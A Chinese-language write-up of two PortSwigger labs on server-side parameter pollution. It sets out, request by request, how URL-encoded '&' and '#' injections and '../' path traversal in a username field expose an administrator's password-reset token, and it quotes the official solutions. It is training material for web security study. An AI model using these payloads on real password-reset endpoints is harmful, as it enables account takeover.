## 测试查询字符串中的服务器端参数污染
### 覆盖现有参数
实验：利用查询字符串中的服务器端参数污染
https://portswigger.net/web-security/api-testing/server-side-parameter-pollution/lab-exploiting-server-side-parameter-pollution-in-query-string

使用忘记密码功能时
POST /forgot-password HTTP/2
csrf=BPt2CAcLStA2TqOARfOuPudB7JyvrMHz&username=administrator
响应为
```json
{
    "type":"email",
    "result":"*****@normal-user.net"
}
```
修改为不存在的用户名
username=administratorfoo
响应为
```json
{"type":"ClientError","code":400,"error":"Invalid username."}
```

修改为经过url编码的参数分隔符号 &
username=administrator%26foo
响应为
```json
{"error": "Parameter is not supported."}
```
此时foo作为参数被接受

修改为 同名参数
username=administrator%26username=carlos
响应为 
```json
{"type":"email","result":"*****@normal-user.net"}
```
同名时服务器处理第一个参数

修改为 逃逸同名参数
username=administrator","username":"carlos
响应为
```json
{"type":"email","result":"******@carlos-montoya.net"}
```
逃逸同名参数时，服务器处理第二个参数


修改为经过url编码后的hash符号 # 
username=administrator%23
响应为
```json
{"error": "Field not specified."}
```

过程中加载脚本
GET /static/js/forgotPassword.js HTTP/2
内容为
```javascript
let forgotPwdReady = (callback) => {
    if (document.readyState !== "loading") callback();
    else document.addEventListener("DOMContentLoaded", callback);
}

forgotPwdReady(() => {
    const queryString = window.location.search;
    const urlParams = new URLSearchParams(queryString);
    const resetToken = urlParams.get('reset-token');
    if (resetToken)
    {
        window.location.href = `/forgot-password?reset_token=${resetToken}`;
    }
    else
    {
        const forgotPasswordBtn = document.getElementById("forgot-password-btn");
        forgotPasswordBtn.addEventListener("click", displayMsg);
    }
});

```
得到参数名称 reset_token


示例解决方案：
之前测试的
修改为经过url编码后的hash符号 # 
username=administrator%23
响应为
```json
{"error": "Field not specified."}
```
> 这表明服务器端查询可能包含一个名为 field，该字段已被 # 字符移除
> 向请求中添加一个带有无效值的 field 参数
> username=administrator%26field=x%23
响应为
```json
{"type":"ClientError","code":400,"error":"Invalid field."}
```
> 这表明服务器端应用程序可能识别到了注入的 field 参数。
> 暴力破解 field 参数的值
> 选择内置的 服务器端变量名 负载列表，然后开始攻击
> 查看结果。注意，包含 username 和 email 负载的请求都返回了 200 响应
修改为 
username=administrator%26field=email%23
得到原始响应
> 这表明 email 是一个有效的字段类型

在此处使用之前发现的字段名 reset_token
username=administrator%26field=reset_token%23
得到
```json
{"type":"reset_token","result":"hlz8pcij3c8jg1ujg6exmycym8apkdc1"}
```

构建url
GET /forgot-password?reset_token=hlz8pcij3c8jg1ujg6exmycym8apkdc1 HTTP/2
响应为设置密码页面

### 测试 REST 路径中的服务器端参数污染

实验：利用 REST URL 中的服务器端参数污染
https://portswigger.net/web-security/api-testing/server-side-parameter-pollution/lab-exploiting-server-side-parameter-pollution-in-rest-url

使用重置密码功能
POST /forgot-password HTTP/2
csrf=utebrtvG3Lxnn0q70vkwnt5Hb99CIJNz&username=administrator
响应为
```json
{"result":"*****@normal-user.net","type":"email"}
```

修改为 不存在用户名
username=administratorfoo
响应为
```json
{
  "type": "error",
  "result": "The provided username \"administratorfoo\" does not exist"
}
```

修改为 添加hash符号 #
username=administrator#
响应为
```json
{
  "type": "error",
  "result": "Invalid route. Please refer to the API definition"
}
```
hash 符号被解析为路径，而不是用户名的一部分

修改为
username=administrator/field/a#
响应为
```json
{
  "type": "error",
  "result": "This version of API only supports the email field for security reasons"
}
```

修改为 REST 风格的路径查询字符串
username=administrator/../carlos
响应为
```json
{"result":"******@carlos-montoya.net","type":"email"}
```
存在服务器端参数污染
此时预计的 url路径为
/username/administrator/../carlos

修改为
username=administrator/../../username/administrator
响应为
```json
{
  "type": "error",
  "result": "Invalid route. Please refer to the API definition"
}
```
username不是有效的路径参数名

发送到攻击器爆破路径参数
username=administrator/../../$username$/administrator
其中响应代码200的请求为
username=administrator/../../users/administrator
响应为原始响应
得到的路径为
/users/administrator

与之前的field组合后为
/users/administrator/field/email
即
username=../users/administrator/field/email#
获得原始响应

修改为
username=../../v2/users/administrator/field/email#
获得原始响应

修改为v1，也可成功

重置页面加载的脚本
GET /static/js/forgotPassword.js HTTP/2
内容为
```javascript
forgotPwdReady(() => {
    const queryString = window.location.search;
    const urlParams = new URLSearchParams(queryString);
    const resetToken = urlParams.get('reset-token');
    if (resetToken)
    {
        window.location.href = `/forgot-password?passwordResetToken=${resetToken}`;
    }
    else
    {
        const forgotPasswordBtn = document.getElementById("forgot-password-btn");
        forgotPasswordBtn.addEventListener("click", displayMsg);
    }
})
```
从中得到参数名 reset-token 与 passwordResetToken

修改为 field/reset-token
username=../../v1/users/administrator/field/reset-token#
响应为
```json
{
  "type": "error",
  "result": "The provided field name \"reset-token\" does not exist and cannot be retrieved"
}
```

修改为 field/passwordResetToken
得到令牌

示例解决方案：
> 将用户名参数的值从 ../administrator 更改为 ../%23。注意 无效路由响应
> 逐步添加更多的 ../ 序列，直到达到 ../../../../%23 注意，这会返回一个 未找到 响应。这表明您已导航到 API 根目录之外
> 在此级别，将一些常见的 API 定义文件名添加到 URL 路径中。例如，提交以下：
> username=../../../../openapi.json%23
> 注意，这会返回一个错误消息，其中包含以下用于查找用户的 API 端点：
> /api/internal/v1/users/{username}/field/{field}
